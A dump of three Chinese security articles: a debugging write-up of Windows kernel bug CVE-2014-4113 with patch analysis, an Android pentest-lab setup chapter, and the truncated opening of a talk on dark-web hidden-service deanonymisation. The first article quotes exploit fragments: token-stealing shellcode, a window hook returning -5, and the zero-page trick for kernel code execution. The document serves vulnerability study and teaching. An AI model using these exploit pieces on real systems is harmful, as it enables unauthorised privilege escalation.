"5ccbfb3e4f2f0a0a7a69c138","前言内核漏洞对我来说一直是一个坎，记得两年前，刚刚接触二进制漏洞的时候，当时今天的主角刚刚出现，当时调试这个漏洞的时候，整个内心都是崩溃的，最近我重温了一下这个","Kong","前言内核漏洞对我来说一直是一个坎，记得两年前，刚刚接触二进制漏洞的时候，当时今天的主角刚刚出现，当时调试这个漏洞的时候，整个内心都是崩溃的，最近我重温了一下这个漏洞，发现随着自己学习进步，对整个内核漏洞分析的过程也变的越来越清晰，而且在这个内核漏洞的调试过程中发现了一些很有意思的调试细节，因此想把自己的这个调试笔记分享出来，希望能和大家多多交流，也能有更多的进步。今天的主角就是CVE-2014-4113，这个win32k.sys下的内核漏洞是一个非常经典的内核漏洞，它无论在Exploit利用，内核漏洞的形成原因，可以说是教科书式的，非常适合对内核漏洞感兴趣的小伙伴入门分析。另一种方法定位漏洞内核漏洞分析是一个比较复杂的过程，其实无论对于内核态漏洞还是软件态漏洞，都需要通过对补丁，或者PoC，或者Exploit进行阅读，通过对源码的分析可以了解到很多和漏洞有关的细节，所以这次我们也要阅读一下关于CVE-2014-4113的Exp，从中获取一些信息。LRESULT CALLBACK ShellCode(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)  {PEPROCESS pCur, pSys ;  fpLookupProcessById((HANDLE)dwCurProcessId,    &amp;pCur);  fpLookupProcessById((HANDLE)dwSystemProcessId, &amp;pSys);  #ifdef _WIN64*(PVOID *)((ULONG_PTR)pCur + dwTokenOffset) = *(PVOID *)((ULONG_PTR)pSys + dwTokenOffset);#else*(PVOID *)((DWORD)pCur + dwTokenOffset) = *(PVOID *)((DWORD)pSys + dwTokenOffset);#endifreturn  0 ;  }在源码分析过程中，我们关注Shellcode函数中的代码片段，可以看到Shellcode做了一件事情，就是针对32位系统和64位系统，会将当前系统的系统进程句柄psys，加上token的偏移赋值给当前用户进程的token，而这种手法也是现在Windows提权中一个非常好用的方法。众所周知，Exploit一般不会影响软件或者系统的正常运行，而会执行Shellcode中的恶意代码，在我们没有PoC来引发软件或者系统异常的情况下，往往会通过Shellcode中的一些关键步骤的跟踪来接近漏洞的触发位置。那么在这个过程中我们就用上面的Shellcode来跟踪这个漏洞。首先我们来说一下_EPROCESS结构体，这个结构体包含着当前进程的很多信息，这个过程我们可以通过!process 0 0的方法来得到。当然这个命令只有在内核态才能使用，我们通常通过Windbg远程调试的方法来完成。可以看到，通过!process 0 0的方法获取到的system进程的句柄位置在0x867c6660，接下来我们来看一下我们执行的Exploit进程位置。当前Exploit的地址是0x86116bb0，这两个地址就是_EPROCESS结构体的地址，下面我们来看一下这个结构体的内容。可以看到，偏移+0x0c8位置存放的就是Token，而结合上面分析的Shellcode的内容，Token就是进行替换提权的关键位置。实际上提权时，就是用0xe10007b3这个系统进程的Token，替换当前用户进程的0xe116438c这个Token，这也是下断点的一个重要依据，通过下条件断点，可以跟踪到当前进程句柄的变化情况。ba w1 86116c78 "".printf \""TOKEN CHANGE TO: [%08x]\\n\"",poi(86116c78);.if(poi(86116c78)==0xe10007b3){;}.else{g;}""  跟踪到00411f88位置的时候，程序中断，也是这时候当前进程句柄被替换，同时回溯到堆栈调用情况。当前堆栈调用展示了整个内核漏洞发生问题的过程，我们需要关注这个回溯过程，在后面的分析中需要用到，也由此我们定位了漏洞触发的关键流程，为后续的分析提供了依据。kd&gt; kb  ChildEBP RetAddr  Args to Child  WARNING: Frame IP not in any known module. Following frames may be wrong.  9b5f7a24 81ff94f3 fffffffb 000001ed 014cfd14 0x1301448  9b5f7a64 81ff95c5 fffffffb 000001ed 014cfd14 win32k!xxxSendMessageTimeout+0x1ac  9b5f7a8c 820792fb fffffffb 000001ed 014cfd14 win32k!xxxSendMessage+0x28  9b5f7aec 82078c1f 9b5f7b0c 00000000 014cfd14 win32k!xxxHandleMenuMessages+0x582  9b5f7b38 8207f8f1 fdf37168 8215f580 00000000 win32k!xxxMNLoop+0x2c6  9b5f7ba0 8207f9dc 0000001c 00000000 ffffd8f0 win32k!xxxTrackPopupMenuEx+0x5cd  9b5f7c14 828791ea 004601b5 00000000 ffffd8f0 win32k!NtUserTrackPopupMenuEx+0xc3  在接下来的调试分析中，由于ASLR的关系，导致有些关键函数地址基址不太一样，不过不影响我们的调试。一些有趣的调试细节关于这个漏洞分析，其实网上有相当多非常详细的分析，这里我就不再做具体分析了，网上的方法多数都是通过Exploit正向分析，而通过Shellcode定位这种方法，可以用回溯的方法分析整个漏洞的形成过程，可能更加便捷，各有优劣。关于这个漏洞的分析，我不再详述，只是在调试过程中发现一些有趣的调试细节，想拿出来和大家一起分享。首先我大概说一下这个漏洞的形成过程，在销毁菜单的过程中会产生一个1EB的消息，因为SendMessage的异步调用，导致在销毁菜单时通过消息钩子的方法，通过截断1EB消息，返回一个0xffffffb的方法，在随后的SendMessageTimeout函数中会调用这个返回值，作为函数调用，而在之前的if语句判断中没有对这个返回值进行有效的检查，当我们通过0页的分配，往0x5b地址位置存入Shellcode地址，这样就会在Ring0态执行应用层代码，导致提权。那么在这个过程中，有一些有意思的地方，第一个是消息钩子截获1EB消息，并且返回0xfffffffb，第二个就是在SendMessageTimeout中在Ring0层执行应用层Shellcode代码的过程。首先在调用xxxTrackPopupMenuEx的时候会销毁窗口，这个过程中会调用SendMessage，实际上，在SendMessage调用的时候，是分为同步和异步两种方式，两种方式的调用也有所不同，先看看同步，调用相对简单。SendMessage (同线程)   SendMessageWorker  UserCallWinProcCheckWow   InternalCallWinProc    WndProc但是当异步调用的时候，情况就相对复杂了，而我们的提权也正是利用了异步的方法，用消息钩子来完成的，首先来看看异步调用的情况。SendMessage (异线程)   SendMessageWorker  NtUserMessageCall (user mode/kernel mode切换)    EnterCrit   NtUserfnINSTRINGNULL (WM_SETTEXT)    RtlInitLargeUnicodeString    xxxWrapSendMessage (xParam = 0)     xxxSendMessageTimeout (fuFlags = SMTO_NORMAL, uTimeout = 0, lpdwResult = NULL)   ⋯⋯  xxxReceiveMessage  xxxSendMessageToClient     sysexit (kernel mode进入user mode)   ⋯⋯         UserCallWinProcCheckWow         InternalCallWinProc          WndProc       XyCallbackReturn       int 2b (user mode返回kernel mode)这里有很关键的两处调用，一个在sysexit，在这个调用的时候，会从内核态进入用户态，也就是说在消息钩子执行的时候，通过这个调用会进入钩子的代码逻辑中，而当应用层代码逻辑执行结束后，会调用int 2b这个软中断，从用户态切换回内核态，这个过程就是通过消息钩子完成的，而正是利用这个钩子，在钩子中销毁窗口并且返回在整个提权过程中至关重要的0xfffffffb。首先在HandleMenuMessages－&gt;MNFindWindowFromPoint之后会进入SendMessage中处理，这个时候通过安装的钩子会截获到1EB消息。源码中钩子的部分。lpPrevWndFunc = (WNDPROC)SetWindowLongA( pWndProcArgs-&gt;hwnd,                                           GWL_WNDPROC,  (LONG)NewWndProc ) ;        // LONGLRESULT CALLBACK NewWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)  {if(uMsg != 0x1EB)  {return CallWindowProcA(lpPrevWndFunc, hWnd, uMsg, wParam, lParam) ;  }EndMenu() ;  return (DWORD)(-5) ; // DWORD  }来看一下动态调试的过程，通过之前对异步SendMessage函数的调用关系可以看到异步调用会进入SendMessageTimeout函数处理，跟入这个函数通过回溯看到函数调用关系。kd&gt; p  win32k!xxxSendMessageTimeout+0x8:  967e934f 56              push    esi  kd&gt; p  win32k!xxxSendMessageTimeout+0x9:  967e9350 57              push    edi  kd&gt; p  win32k!xxxSendMessageTimeout+0xa:  967e9351 8b7d20          mov     edi,dword ptr [ebp+20h]  kd&gt; kb  ChildEBP RetAddr  Args to Child  a216ca1c 967e95c5 fea0e878 000001eb a216ca98 win32k!xxxSendMessageTimeout+0xa  a216ca44 968695f6 fea0e878 000001eb a216ca98 win32k!xxxSendMessage+0x28  a216ca90 96868e16 fde80a68 a216cafc 00000000 win32k!xxxMNFindWindowFromPoint+0x58  a216caec 96868c1f a216cb0c 9694f580 00000000 win32k!xxxHandleMenuMessages+0x9e  随后我们单步跟踪，在SendMessageTimeout函数中找到调用SendMessageToClient函数。kd&gt; p  win32k!xxxSendMessageTimeout+0x1c9:  967e9510 56              push    esi  kd&gt; p  win32k!xxxSendMessageTimeout+0x1ca:  967e9511 e81aaaffff      call    win32k!xxxSendMessageToClient (967e3f30)  通过IDA pro分析这个函数，在LABLE_16位置调用了一个叫sfn的函数，这个sfn的函数就是负责进入用户态的。LABEL_16:      result = SfnDWORD(v17, v18, v19, (int)v20, v21, v22, v23, v24);int __stdcall SfnDWORD(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8)    v9[53].Next[12].Next = v8;  ms_exc.registration.TryLevel = -2;  UserSessionSwitchLeaveCrit();  v27 = KeUserModeCallback(2, &amp;v21, 24, &amp;v28, &amp;v29);当sysexit调用后，内核态和用户态进行了切换。进入用户态，应用层就是我们的钩子内容。kd&gt; p  Breakpoint 6 hit  001b:00f21600 55              push    ebp  实际上，这就是一个钩子之间的调用过程，也是提权漏洞利用过程中一个至关重要的环节。那么接下来，在钩子函数中，我们会利用EndMenu函数销毁窗口，并且返回0xfffffffb，这个过程在很多分析中都有了，下面我们来看看从用户态切换回内核态的过程。首先销毁窗口后，0xfffffffb会交给eax寄存器，随后进入返回过程。kd&gt; bp 00251631  kd&gt; g  Breakpoint 1 hit  001b:00251631 b8fbffffff      mov     eax,0FFFFFFFBh  kd&gt; kb  ChildEBP RetAddr  Args to Child  WARNING: Frame IP not in any known module. Following frames may be wrong.  014cf5b4 769dc4e7 000e0240 000001eb 014cf6e4 0x251631  014cf5e0 769dc5e7 00251600 000e0240 000001eb user32!InternalCallWinProc+0x23  014cf658 769d4f0e 00000000 00251600 000e0240 user32!UserCallWinProcCheckWow+0x14b  014cf6b4 76a0f0a3 005be8b0 000001eb 014cf6e4 user32!DispatchClientMessage+0xda  014cf6dc 77106fee 014cf6f4 00000018 014cf7ec user32!__fnOUTDWORDINDWORD+0x2a  我们在应用层通过回溯，可以看到回溯过程中的函数调用，这里单步调试，可以跟踪到连续向外层函数进行返回。也就是不停的执行pop,ret的过程，直到跟踪到user32!_fnOUTDOWRDINDWORD中，我们单步跟踪。kd&gt; p  user32!__fnOUTDWORDINDWORD+0x2e:  001b:76a0f0a7 5a              pop     edx  kd&gt; p  user32!__fnOUTDWORDINDWORD+0x2f:  001b:76a0f0a8 8d4df4          lea     ecx,[ebp-0Ch]  kd&gt; p  user32!__fnOUTDWORDINDWORD+0x32:  001b:76a0f0ab 8945f4          mov     dword ptr [ebp-0Ch],eax  kd&gt; p  user32!__fnOUTDWORDINDWORD+0x35:  001b:76a0f0ae e86171fcff      call    user32!XyCallbackReturn (769d6214)  在fnOUTDWORDINDWORD中，调用了XyCallbackReturn，再回头看之前关于SendMessage函数异步过程的描述，XyCallbackReturn正是从用户态切换回内核态一个关键函数调用，跟进这个函数，可以观察到调用了int 2B软中断，回归内核态kd&gt; t  user32!XyCallbackReturn:  001b:769d6214 8b442404        mov     eax,dword ptr [esp+4]  kd&gt; p  user32!XyCallbackReturn+0x4:  001b:769d6218 cd2b            int     2Bh  这个过程会携带钩子的返回结果，从而到后面执行shellcode，回归内核态之后，来看一下调用到shellcode。kd&gt; g  Breakpoint 4 hit  win32k!xxxSendMessageTimeout+0x1a9:  967e94f0 ff5660          call    dword ptr [esi+60h]  kd&gt; dd esi  fffffffb  ???????? ???????? fe9d3dd8 00000000  kd&gt; dd esi+60  0000005b  00f61410 00000000 00000000 00000000  kd&gt; t  00f61410 55              push    ebp  Executable search path is:  ModLoad: 00f60000 00f67000   EoP.exe  ModLoad: 770c0000 771fc000   ntdll.dll  ModLoad: 76760000 76834000   C:\Windows\system32\kernel32.dll  我们事先在0x5b地址位置分配了0页内存，然后往里存放了一shellcode的地址，这样call esi＋60相当于call 0x5b，从而进入shellcode的内容。其实在调试漏洞的过程中，钩子的调用是一个很有趣的过程，也是触发这个漏洞的关键，同样，不仅仅是CVE-2014-4113，在很多Windows提权漏洞的利用上，都用到了类似手法，比如CVE-2015-2546等等。在文章一开始，我提到这个漏洞的关键原因是一处if语句判断不严谨导致的漏洞发生，当结束了这个有趣的调试细节之后，我将通过补丁对比，以及补丁前后的动态调试来看看这个漏洞的罪魁祸首是什么。补丁对比与过程分析我们安装CVE-2014-4113的补丁，可以看到，补丁后利用提权工具提权后，仍然不能获得系统权限。补丁前：补丁后：我们通过BinDiff来分析一下这个补丁前后发生了哪些变化，这时候我们需要通过文章最开始，我们在定位了提权发生的位置之后，通过堆栈回溯的过程看到的函数调用关系，来确定我们应该看看哪些函数发生了变化。实际上补丁前后大多数函数变化都不大，但是看到xxxHandleMenuMessages中存在一些小变化，跟进这个函数查看对比。注意对比图下方有一些跳转产生了变化，放大下面这个块的内容。左侧黄块和这个漏洞无关，可以看到左侧是两个绿色块直接相连，表示直接跳转，而右侧补丁后，则在两个绿块之间增加了一个黄块，观察黄块，其中调用了一个IsMFMWFPWindow函数，这个函数可以通过IDA pro看到它的作用。实际上就是一个bool函数，用来限制0，－1和－5的情况，下面我们来动态调试分析。BOOL __stdcall IsMFMWFPWindow(int a1)  {  return a1 &amp;&amp; a1 != -5 &amp;&amp; a1 != -1;}首先是补丁前，会经过一系列的if判断，直接单步跟踪到最关键的一处if判断。if ( *(_BYTE *)v3 &amp; 2 &amp;&amp; v13 == -5 )  kd&gt; p  win32k!xxxHandleMenuMessages+0x54c:  968692c5 f60702          test    byte ptr [edi],2  kd&gt; p  win32k!xxxHandleMenuMessages+0x54f:  968692c8 740e            je      win32k!xxxHandleMenuMessages+0x55f (968692d8)这个if判断其实是想处理0xfffffffb的情况的，也就是说，当v13的值等于－5，也就是0xfffffffb的时候，会进入if语句，而不会执行将－5传递到下面的SendMessage中，然而这个if语句中的是与运算，也就是说，当前面v3&amp;2不成立的时候，就不会进入if语句了，而动态调试前面是不成立的，直接跳转到后面的if语句判断。if ( v13 == -1 )  kd&gt; p  win32k!xxxHandleMenuMessages+0x55f:  968692d8 83fbff          cmp     ebx,0FFFFFFFFh  kd&gt; p  win32k!xxxHandleMenuMessages+0x562:  968692db 750e            jne     win32k!xxxHandleMenuMessages+0x572 (968692eb)  这就导致了－5被传递到后面的SendMessage，从而导致了后面的代码执行。win32k!xxxHandleMenuMessages+0x572:  968692eb 6a00            push    0  kd&gt; p  win32k!xxxHandleMenuMessages+0x574:  968692ed ff7510          push    dword ptr [ebp+10h]  kd&gt; p  win32k!xxxHandleMenuMessages+0x577:  968692f0 68ed010000      push    1EDh  kd&gt; p  win32k!xxxHandleMenuMessages+0x57c:  968692f5 53              push    ebx  kd&gt; p  win32k!xxxHandleMenuMessages+0x57d:  968692f6 e8a202f8ff      call    win32k!xxxSendMessage (967e959d)  kd&gt; dd esp  8b46fa94  fffffffb 000001ed 0091f92c 00000000  可以看到，当执行SendMessage的时候，第一个参数为0xfffffffb，后续会在SendMessageTimeOut中引发进入Shellcode，这个之前已经提到。接下我们一起看一下补丁后的调试情况，补丁后，引入了IsMFMWFPWindow函数多做了一个if语句的判断。kd&gt; r  eax=00040025 ebx=fffffffb ecx=8a8d7a74 edx=8a8d7b74 esi=9765b880 edi=fe5ffa68  eip=9756bf10 esp=8a8d7aa0 ebp=8a8d7ae8 iopl=0         nv up ei ng nz ac pe cy  cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000297  win32k!xxxHandleMenuMessages+0x570:  9756bf10 53              push    ebx  kd&gt; p  win32k!xxxHandleMenuMessages+0x571:  9756bf11 e889b90000      call    win32k!IsMFMWFPWindow (9757789f)  可以看到ebx作为参数传入IsMFMWFPWindow，ebx的值为0xfffffffb，而这个值是－5，判断肯定是不通过的，返回false。kd&gt; p  win32k!IsMFMWFPWindow+0xb:  975778aa 837d08fb        cmp     dword ptr [ebp+8],0FFFFFFFBh  kd&gt; p  win32k!IsMFMWFPWindow+0xf:  975778ae 740b            je      win32k!IsMFMWFPWindow+0x1c (975778bb)  kd&gt; p  win32k!IsMFMWFPWindow+0x1c:  975778bb 33c0            xor     eax,eax  可以看到ebp＋8判断是否为false，这里是为false的，所以跳转，不执行SendMessage，这样漏洞就被修补了，我们最后来看一下补丁前后的伪代码。补丁前： v13 = xxxMNFindWindowFromPoint(v3, (int)&amp;UnicodeString, (int)v7);            v52 = IsMFMWFPWindow(v13);            ……//省略一部分代码            if ( *(_BYTE *)v3 &amp; 2 &amp;&amp; v13 == -5 )//key！这里第一个判断不通过            {              xxxMNSwitchToAlternateMenu(v3);              v13 = -1;            }            if ( v13 == -1 )              xxxMNButtonDown((PVOID)v3, v12, UnicodeString, 1);            else              xxxSendMessage((PVOID)v13, -19, UnicodeString, 0);//key！补丁后：v29 = xxxMNFindWindowFromPoint((WCHAR)v3, (int)&amp;UnicodeString, (int)v7);      v50 = IsMFMWFPWindow(v29);    if ( v50 )    {      ……    }    else     {      if ( !v29 &amp;&amp; !UnicodeString &amp;&amp; !(v30 &amp; 0x200) )//了      {        ……      }      ……      if ( v29 == -1 )        goto LABEL_105;    }    if ( IsMFMWFPWindow(v29) )//Key！！！这里先调用了IsMFMWFPWindows做了一个判断，然后才send      xxxSendMessage((PVOID)v29, -17, UnicodeString, Address);到此，这个内核漏洞解剖完毕，以前一直觉得内核漏洞很可怕，现在仔细分析之后，其实发现内核漏洞也是很有意思的，仿佛给我开了一扇新的大门，里面有很多有趣的东西值得去探索，分析的时候只要理清逻辑关系，其实会简单好多，文章中如有不当之处还请各位大牛斧正，多多交流，谢谢！","2016-11-08 16:51:19","网络安全","经典内核漏洞调试笔记","http://nsoad.com/Article/Network-security/20161108/718.html"
"5ccbfb3e4f2f0a0a7a69c139","在上一章中，我们了解了 Android 安全性及其体系结构的基础知识。 在本章中，我们将了解如何建立 Android 渗透测试实验环境，其中包括下载和配置 Android SDK 和 Eclipse。","Aditya Gupta","本文来源：看雪学院  编译作者：飞龙使者   原文出自：Learning Pentesting for Android Devices  网络攻防小组Kong.整理发布在上一章中，我们了解了 Android 安全性及其体系结构的基础知识。 在本章中，我们将了解如何建立 Android 渗透测试实验环境，其中包括下载和配置 Android SDK 和 Eclipse。 我们将深入了解 ADB，并了解如何创建和配置 Android 虚拟设备（ AVD） 。2.1建 立 开 发 环 境为了构建 Android 应用程序或创建 Android 虚拟设备，我们需要配置开发环境，以便运行这些应用程序。 因此，我们需要做的第一件事是下载 Java 开发工具包（JDK），其中包括Java 运行时环境（ JRE） ：1. 为了下载 JDK，我们需要访问 http://www.oracle.com/technetwork/java/javase /downloads/index.html ，并根据我们所在的平台下载 JDK 7。就像下载它并运行下载的可执行文件一样简单。 在以下屏幕截图中，你可以看到我的系统上安装了 Java：2. 一旦我们下载并安装了 JDK，我们需要在我们的系统上设置环境变量，以便可以从任何路径执行 Java。对于 Windows 用户，我们需要右键单击 My Computer（ 我的电脑） 图标，然后选择 Properties（ 属性） 选项。3. 接下来，我们需要从顶部选项卡列表中选择 Advanced system settings （ 高级系统设置）选项：4. 一旦我们进入了 System Properties （ 系统属性） 对话框，在右下角，我们可以看到 Environment Variables... （ 环境变量） 选项。 当我们点击它，我们可以看到另一个窗口，包含系统变量及其值，在 System variables （ 系统变量） 部分下：5. 在新的弹出对话框中，我们需要单击 Variables （ 变量） 下的 PATH 文本框，并键入Java 安装文件夹的路径：对于 Mac OS X，我们需要编辑 /.bash_profile 文件，并将 Java 的路径追加到 PATH 变量。在 Linux 机器中，我们需要编辑 ./bashrc 文件并附加环境变量行。 这里是命令：$ nano ~/.bashrc $ export JAVA_HOME=`/usr/libexec/java_home -v 1.6` or export JAVA_HOME=`/usr/libex ec/java_home -v 1.7`你还可以通过从终端运行以下命令来检查 Java 是否已正确安装和配置：$ java --version6. 一旦我们下载并配置了 Java 的环境变量，我们需要执行的下一步是下载 http://developer.android.com/sdk/index.html 中提供的 Android ADT 包。ADT 包是由 Android 团队准备的一个完整的包，包括配置了 ADT 插件，Android SDK 工具，Android 平台工具，最新的 Android 平台和模拟器的 Android 系统映像的 Eclipse。这大大简化了早期下载和使用 Android SDK 配置 Eclipse 的整个过程，因为现在的一切都已预先配置好了。7. 一旦我们下载了 ADT 包，我们可以解压它，并打开 Eclipse 文件夹。8. 启动时，ADT 包将要求我们配置 Eclipse 的工作区。 workspace （ 工作空间） 是所有Android 应用程序开发项目及其文件将被存储的位置。在这种情况下，我已将所有内容保留默认，并选中 Use this as the default and do not ask me again （ 使用此为默认值，不再询问我） 复选框：9. 一旦完全启动，我们可以继续创建 Android 虚拟设备。 Android 虚拟设备是配置用于特定版本的 Android 的模拟器配置。 模拟器是与 Android SDK 软件包一起提供的虚拟设备，通过它，开发人员可以运行正常设备的应用程序，并与他们在实际设备上进行交互。 这对于没有 Android 设备但仍然想创建 Android 应用程序的开发者也很有用。注 这里要注意的一个有趣的特性是，在 Android 中，模拟器运行在 ARM 上，模拟的所有的事情与真实设备完全相同。 然而，在 iOS 中，我们的模拟器只是模拟环境，并不拥有所有相同组件和平台。2.2创 建 Android 虚 拟 设 备为了创建 Android 虚拟设备，我们需要执行以下操作：1. 访问 Eclipse 的顶部栏，然后点击 Android 图标旁边的设备图标。 这将打开一个新的 Android Virtual Device Manager （ Android 虚拟设备管理器） 窗口，其中包含所有虚拟设备的列表。 这是一个很好的选择，通过点击 New （ 新建） 按钮，创建一个新的虚拟设备。2. 我们还可以通过从终端运行 android 命令并访问工具，然后管理 AVD 来启动 Android 虚拟设备。 或者，我们可以简单指定 AVD 名称，并使用模拟器 -avd [avd-name] 命令来启动特定的虚拟设备。这会打开一个新窗口，其中包含需要为 Android 虚拟设备配置的所有属性（ 尚未创建） 。 我们将配置所有选项，如下面的截图所示：3. 一旦我们点击 OK 并返回到 AVD 管理器窗口，我们将看到我们新创建的 AVD。4. 现在，只需选择新的 AVD，然后单击 Start... （ 开始） 来启动我们创建的虚拟设备。它可能需要很长时间，来为你的第一次使用加载，因为它正在配置所有的硬件和软件配置，来给我们真正的电话般的体验。5. 在以前的配置中，为了节省虚拟设备的启动时间，选中 Snapshot 复选框也是一个不错的选择。6. 一旦设备加载，我们现在可以访问我们的命令提示符，并使用 android 命令检查设备配置。 此二进制文件位于安装中的 /sdk/tools 文件夹下的 adt-bundle 文件夹中。7. 我们还要设置位于 sdk 文件夹中的 tools 和 platform-tools 文件夹的位置，就像我们之前使用环境变量一样。8. 为了获取我们系统中已连接（ 或加载） 的设备的详细配置信息，可以运行以下命令：android list avd我们在下面的屏幕截图中可以看到，上面的命令的输出显示了我们系统中所有现有 Android 虚拟设备的列表：9. 我们现在将继续，使用 ADB 或 Android Debug Bridge 开始使用设备，我们在上一章中已经看到。 我们还可以通过在终端中执行 emulator -avd [avdname] 命令来运行模拟器。2.3渗 透 测 试 实 用 工 具现在，让我们详细了解一些有用的 Android 渗透测试实用工具，如 Android Debug Bridge，Burp Suite 和 APKTool。Android Debug BridgeAndroid Debug Bridge 是一个客户端 - 服务器程序，允许用户与模拟器器或连接的 Android设备交互。 它包括客户端（ 在系统上运行） ，处理通信的服务器（ 也在系统上运行） 以及作为后台进程在模拟器和设备上上运行的守护程序。 客户端用于 ADB 通信的默认端口始终是5037，设备使用从 5555 到 5585 的端口。让我们继续，通过运行 adb devices 命令开始与启动的模拟器交互。 它将显示模拟器已启动并运行以及连接到 ADB：C:\Users\adi0x90\Downloads\adt-bundle\sdk\platform-tools&gt;adb devices List of devices attached  emulator-5554 device在某些情况下，即使模拟器正在运行或设备已连接，你也不会在输出中看到设备。 在这些情况下，我们需要重新启动 ADB 服务器，杀死服务器，然后再次启动它：C:\Users\adi0x90\Downloads\adt-bundle\sdk\platform-tools&gt;adb kill-server C:\Users\adi0x90\Downloads\adt-bundle\sdk\platform-tools&gt;adb start-server * daemon not running. starting it now on port 5037 * * daemon started successfully *我们还可以使用 pm （ 包管理器） 工具获取所有已安装的软件包的列表，这可以在 ADB 中使用：adb shell pm list packages如下面的屏幕截图所示，我们将获得设备上安装的所有软件包的列表，这在以后的阶段可能会有用：此外，我们可以使用 dumpsys meminfo 然后是 adb shell 命令，获取所有应用程序及其当前内存占用的列表我们还可以获取 logcat （ 这是一个读取 Android 设备事件日志的工具） ，并将其保存到特定文件，而不是在终端上打印：adb logcat -d -f /data/local/logcats.log此处的 -d 标志指定转储完整日志文件的并退出， -f 标志指定写入文件而不是在终端上打印。 这里我们使用 /data/local 位置，而不是任何其他位置，因为这个位置在大多数设备中是可写的。我们还可以使用 df 命令检查文件系统以及可用空间和大小：在 Android SDK 中还有另一个很棒的工具，称为 MonkeyRunner。 此工具用于自动化和测试 Android 应用程序，甚至与应用程序交互。 例如，为了使用 10 个自动化触摸，敲击和事件来测试应用程序，我们可以在 adb shell中使用 monkey 10 命令：root@generic:/ # monkey 10 monkey 10 Events injected: 10 ## Network stats: elapsed time=9043ms (0ms mobile, 0ms wifi, 9043ms not connected)这些是一些有用的工具和命令，我们可以在 ADB 中使用它们。 我们现在将继续下载一些我们将来使用的其他工具。Burp Suite我们将在接下来的章节中使用的最重要的工具之一是 Burp 代理。 我们将使用它来拦截和分析网络流量。 应用程序中的许多安全漏洞可以通过拦截流量数据来评估和发现。 在以下步骤中执行此操作：1. 我们现在从官方网站 http://portswigger.net/burp/download.html 下载 burp 代理。 下载并安装后，你需要打开 Burp 窗口，它如以下屏幕截图所示。 你还可以使用以下命令安装 Burp：java –jar burp-suite.jar我们在下面的截图中可以看到，我们运行了 Burp 并显示了默认界面：2. 在 Burp Suite 工具中，我们需要通过单击 Proxy （ 代理） 选项卡并访问 Options （ 选项） 选项卡来配置代理设置。3. 在 Options 选项卡中，我们可以看到默认选项被选中，这是 127.0.0.1:8080 。 这意味着从我们的系统端口 8080 发送的所有流量将由 Burp Suite 拦截并且在它的窗口显示。4. 我们还需要通过选择默认代理 127.0.0.1:8080 并单击 Edit （ 编辑） 来检查隐藏的代理选项。5. 接下来，我们需要访问 Request handling （ 请求处理） 选项卡，并中 Support invisible proxying (enable only if needed) （ 支持不可见代理（ 仅在需要时启用） ） 复选框：6. 最后，我们使用 invisible 选项运行代理：7. 一旦设置了代理，我们将启动我们的模拟器与我们刚刚设置的代理。 我们将使用以下模拟器命令来使用 http-proxy 选项：emulator -avd [name of the avd] -http-proxy 127.0.0.1:8080我们可以在下面的截图中看到命令如何使用：因此，我们已经配置了 Burp 代理和模拟器，导致所有的模拟器流量现在会通过Burp。 在这里，你在访问使用 SSL 的网站时可能会遇到问题，我们将在后面的章节中涉及这些问题。APKToolAndroid 逆向工程中最重要的工具之一是 APKTool。 它为逆向第三方和封闭的二进制 Android 应用程序而设计。 这个工具将是我们在未来章节中的逆向主题和恶意软件分析的重点之一。为了开始使用 APKTool，请执行以下步骤：1. 为了下载 APKTool，我们需要访问 https://code.google.com/p/android-apktool/downloads/list 。在这里，我们需要下载两个文件： apktool1.5.3.tar.bz2 ，其中包含 apktool 主二进制文件，另一个文件取决于平台 - 无论是 Windows，Mac OS X 还是 Linux。2. 一旦下载和配置完成，出于便利，我们还需要将 APKTool 添加到我们的环境变量。 此外，最好将 APKTool 设置为环境变量，或者首先将其安装在 /usr/bin 中。 然后我们可以从我们的终端运行 APKTool，像下面的截图这样：总 结在本章中，我们使用 Android SDK，ADB，APKTool 和 Burp Suite 建立了 Android 渗透测试环境。 这些是 Android 渗透测试者应该熟悉的最重要的工具。在下一章中，我们将学习如何逆向和审计 Android 应用程序。 我们还将使用一些工具，如 APKTool，dex2jar，jd-gui 和一些我们自己的命令行必杀技。","2017-02-25 13:48:11","移动安全","Android 渗透测试学习手册（二）准备实验环境","http://nsoad.com/Article/MobileSecurity/20170225/1082.html"
"5ccbfb3e4f2f0a0a7a69c13a","各位Freebuf的同学们大家好，我将会在这一系列的文章中跟大家讨论有关匿名系统安全方面内容，包括暗网的运行机制以及其中的各种匿名服务。以下是我在2016年HackFest大会（","kong","各位Freebuf的同学们大家好，我将会在这一系列的文章中跟大家讨论有关匿名系统安全方面内容，包括暗网的运行机制以及其中的各种匿名服务。以下是我在2016年HackFest大会（2016年11月5日）上所做的演讲内容，如果有不对的地方欢迎大家批评指正。写在前面的话我的名字叫Sarah，我是一名独立的匿名隐私研究人员。在此之前，我曾经是一名任职于亚马逊公司的安全工程师，当时我的工作就是帮助公司防止攻击者通过机器学习系统来对我们客户进行网络欺诈活动。在加入亚马逊之前，我还是英国情报机构政府通信总部（GCHQ）一名计算机科学家。不过不好意思，有关GCHQ的工作内容我就不能告诉各位了。今天，我准备跟大家讨论一些关于匿名性和隐私安全方面的东西，所有的这些内容我都已经在网站mascherari.press上发布过了，感兴趣的同学可以访问查看。内容概述首先，我会跟大家简单介绍一下关于隐藏服务安全方面的内容。请大家放心，我不会再去跟各位详细讨论Tor网络的运行机制。我相信即便你并不是十分了解匿名服务，你同样能够听得懂我在说什么。在今年年初，我曾对目前匿名系统的安全性进行了研究，我总结出了该系统目前所面临的五大安全风险，所以我首先会向大家介绍这五大安全风险。接下来就是我此次演讲的核心内容了，我会告诉大家暗网所能实现的匿名化程度到底有多高，这部分内容也是我这几个月以来的研究成果。介绍完之后，我还会给大家提供几个研究案例。不过在此我要提醒大家的是，虽然我会提到关于去匿名化的内容，但是在演讲过程中我并不会直接告诉大家如何实现去匿名化以及哪些因素将有可能导致访问者身份暴露。最后，我将在演讲结束之前与大家分享我对暗网未来的看法。除此之外，我也会与大家讨论我们应该如何去解决暗网目前所面临的安全问题。基本概念现在，我准备给大家介绍一下什么是隐藏服务，尤其是如何实现隐藏服务的去匿名化。这其实并不算是密码学研究上的新突破，而且也不会对Tor网络和其他的匿名网络产生影响。实际上，我今天所要演示给大家看的东西可以让网站运营者和软件设计者更加清楚地知道我们到底应该保护那些类型的信息。关于隐藏服务最重要的一点就是，它们所要隐藏的东西其实就是IP地址，这一点请你记住。如果服务隐藏在某个匿名